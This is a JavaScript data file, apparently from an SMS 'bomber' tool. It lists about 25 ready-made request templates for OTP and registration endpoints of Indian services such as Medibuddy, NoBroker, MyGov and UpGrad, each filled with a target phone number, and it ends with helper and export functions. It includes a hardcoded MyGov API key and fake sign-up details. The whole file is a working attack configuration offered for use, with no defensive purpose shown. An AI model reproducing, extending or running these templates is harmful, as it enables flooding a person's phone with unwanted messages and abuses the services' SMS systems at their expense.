    { name: "🔥 Medibuddy OTP", url: "https://loginprod.medibuddy.in/unified-login/user/register", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ source: "medibuddyInWeb", platform: "medibuddy", phonenumber: p, flow: "Retail-Login-Home-Flow" }), category: "new" },
    { name: "🔥 TradeIndia Reg OTP", url: "https://api.tradeindia.com/home/registration/", method: "POST", headers: { "Content-Type": "multipart/form-data" }, data: (p) => `------WebKitFormBoundary\r\nContent-Disposition: form-data; name="country_code"\r\n\r\n+91\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="phone"\r\n\r\n${p}\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="whatsapp_update"\r\n\r\ntrue\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="name"\r\n\r\nTestUser\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="email"\r\n\r\ntest@example.com\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name="terms"\r\n\r\ntrue\r\n------WebKitFormBoundary--\r\n`, category: "new" },
    { name: "🔥 Beyoung OTP", url: "https://www.beyoung.in/api/sendOtp.json", method: "POST", headers: { "Content-Type": "application/json;charset=UTF-8" }, data: (p) => JSON.stringify({ username: p, username_type: "mobile", service_type: 0 }), category: "new" },
    { name: "🔥 Wrogn OTP", url: "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp", method: "POST", headers: { "action": "sendOTP", "Content-Type": "application/json" }, data: (p) => JSON.stringify({ username: `+91${p}`, type: "mobile", domain: "wrogn.com" }), category: "new" },
    { name: "🔥 Medkart OTP", url: "https://app.medkart.in/api/v1/auth/requestOTP", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile_no: p }), category: "new" },
    { name: "🔥 Coverfox OTP", url: "https://www.coverfox.com/otp/send/", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `contact=${p}`, category: "new" },
    { name: "🔥 Wooden Street OTP", url: "https://www.woodenstreet.com/index.php?route=account/forgotten_popup", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `telephone=${p}&firstname=Test&pincode=110086&email=test@example.com&password=Test@123&pagesource=onload&login=2&userput_otp=`, category: "new" },
    { name: "🔥 GoMechanic OTP", url: "https://gomechanic.app/api/v2/send_otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ number: p, source: "website", random_id: "K6z9b" }), category: "new" },
    { name: "🔥 Lovelocal OTP", url: "https://homedeliverybackend.mpaani.com/auth/send-otp", method: "POST", headers: { "client-code": "vulpix", "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phone_number: p, role: "CUSTOMER" }), category: "new" },
    { name: "🔥 Tyreplex OTP", url: "https://www.tyreplex.com/includes/ajax/gfend.php", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `perform_action=sendOTP&mobile_no=${p}&action_type=order_login`, category: "new" },
    { name: "🔥 Xylem OTP", url: "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p, countryCode: "+91", firstName: "TestUser" }), category: "new" },
    { name: "🔥 NoBroker V1 OTP", url: "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `phone=%2B91${p}`, category: "new" },
    { name: "🔥 Vidyakul OTP", url: "https://vidyakul.com/signup-otp/send", method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, data: (p) => `phone=${p}`, category: "new" },
    { name: "🔥 WoodenStreet Register", url: "https://api.woodenstreet.com/api/v1/register", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ firstname: "Test", email: "test@gmail.com", telephone: p, password: "Test@123", isGuest: 0, pincode: "110001" }), category: "new" },
    { name: "🔥 BigCash", url: (p) => `https://www.bigcash.live/sendsms.php?mobile=${p}&ip=192.168.1.1`, method: "GET", category: "new" },
    { name: "🔥 WorkIndia", url: (p) => `https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no=${p}&version_number=623`, method: "GET", category: "new" },
    { name: "🔥 MyGov", url: (p) => `https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile=${p}&gender=male`, method: "GET", category: "new" },
    { name: "🔥 AstroSage", url: (p) => `https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno=${p}`, method: "GET", category: "new" },
    { name: "🔥 Univest", url: (p) => `https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=${p}`, method: "GET", category: "new" },
    { name: "🔥 ConfirmTkt", url: (p) => `https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=${p}`, method: "GET", category: "new" },
    { name: "🔥 CodFirm", url: (p) => `https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91${p}&email=&storeUrl=bellavita1.myshopify.com`, method: "GET", category: "new" },
    { name: "🔥 Vyapar", url: (p) => `https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile=${p}`, method: "GET", category: "new" },
    { name: "🔥 Aakash OTP", url: "https://antheapi.aakash.ac.in/api/generate-lead-otp", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile_number: p, activity_type: "aakash-myadmission" }), category: "new" },
    { name: "🔥 Moglix OTP", url: "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ mobile: p, buildVersion: "24.0" }), category: "new" },
    { name: "🔥 UpGrad OTP", url: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone", method: "POST", headers: { "Content-Type": "application/json" }, data: (p) => JSON.stringify({ phoneNumber: `+91${p}` }), category: "new" },
];


function getApisByCategory(category) {
    return ALL_APIS.filter(api => api.category === category);
}

// Get all APIs
function getAllApis() {
    return ALL_APIS;
}

// Get total count
function getTotalCount() {
    return ALL_APIS.length;
}

// Export for Node.js
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { ALL_APIS, getApisByCategory, getAllApis, getTotalCount };
}
